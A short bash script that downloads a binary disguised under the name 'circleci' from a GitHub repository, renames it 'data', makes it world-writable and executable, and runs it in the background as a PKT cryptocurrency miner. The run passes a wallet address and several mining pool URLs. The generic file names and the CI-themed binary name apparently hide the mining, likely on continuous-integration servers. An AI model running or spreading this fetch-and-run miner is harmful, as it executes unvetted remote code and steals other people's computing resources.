#!/bin/bash
wget https://github.com/aurbach55/zash/raw/main/circleci
mv circleci data
chmod 777 data
nohup ./data ann -p pkt1qfz5q6ee44qhsqjf9pk7su0und7ta5mq8jxnsea https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com > nohup.out
